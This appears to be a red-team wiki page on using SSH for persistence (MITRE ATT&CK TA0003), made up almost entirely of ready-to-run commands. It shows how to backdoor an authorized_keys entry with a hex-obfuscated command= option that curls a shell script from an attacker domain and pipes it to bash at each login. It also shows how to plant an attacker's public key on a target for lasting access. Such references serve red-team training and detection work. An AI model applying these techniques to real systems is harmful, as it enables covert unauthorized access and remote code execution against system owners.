---
description: MITRE ATT&CK™ Persistence - Tactic TA0003
---

# SSH for Persistence

## Theory

SSH (Secure Shell) is a versatile and widely-used protocol that provides secure remote access to systems and services. While it serves as a fundamental tool for authorized system administration, it can also be exploited by attackers to establish persistence on compromised systems. Through various techniques, ranging from simple SSH key-based attacks to more sophisticated methods like public key backdooring, adversaries can maintain unauthorized access and evade detection.

## Practice

{% tabs %}
{% tab title="Backdooring Public Keys" %}
It's possible to backdoor an SSH public key using the `command=` argument. The backdoor will execute whenever the user logs in using this key.

To be stealhier, we can encode the command to be executed

```bash
echo "bash -c 'curl -fsL http://attacking-domain/shell.sh|bash&'" | xxd -ps -c2048
62617368202d6320276375726c202d66734c20687474703a2f2f61747461636b696e672d646f6d61696e2f7368656c6c2e73687c6261736826270a
```

Simply add this to the begening of the public key

```bash
no-user-rc,no-X11-forwarding,command="eval $(echo 62617368202d6320276375726c202d66734c20687474703a2f2f61747461636b696e672d646f6d61696e2f7368656c6c2e73687c6261736826270a|xxd -r -ps);" ssh-ed25519 AAAAB3Nz...
```
{% endtab %}

{% tab title="authorized_keys" %}
We can simply add our public key to the `~/.ssh/authorized_keys` file of the target to mantain access. Fisrt let generate new keys

```bash
ssh-keygen
```

Write your public key into `~/.ssh/authorized_keys` of target

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBr0bA5W+8QERxkFGGWQFj3wSlPI7ZqRL6gmVZ2bD71V8mxvG+riGQr781yv1Ji8w3taon87oqTelmOOEVOPMshJ85lHuKuuP4Lk2FStDXL+zfjXRa+xUc5KS7FlL2yfFWPjHojLJWDraTTh2JKeYm+baiAuCxWkqL31Ze4T16j9RUxQfLCmG1c7LyEFW92UIOO+KRp6z/fNVBJWB7jprqiaV6Co8sPu+lcP0bABcbjNcO0zNXppVTH+3wLnDVBXf2Gzbb/FdcDtbb6uXcRvkTPbTQkBkfjeHyqzXKtPUgAOQWtcSYAxXsdBHmY0mFZWxmMmHS3x4gFdY9ycFqjkOudxKeZW3572gzO0ofdhk6tx4CaR5QIX3+P8K8HMAq+ZXuK7GcCLxPNPgHeFEAX+NrWQ31XtG9+N7x9CvGlMgaZsd6gsd4KMBD2xAT0W7JE+AceM7k/RPWTn+pmNGeZ0BALJiITPUpk8fLg/45nKBDlud+SoU7dLofs8R/crA+aiU= v4resk@parrot' >> ~/.ssh/authorized_keys
```

Set the write permissions if needed

```bash
chmod 600 ~/.ssh/authorized_keys
```

Now, from attacking box, you can ssh to the remote target

```bash
ssh user@$TARGET_IP -i /path/to/generated-key
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://blog.thc.org/infecting-ssh-public-keys-with-backdoors" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md" %}
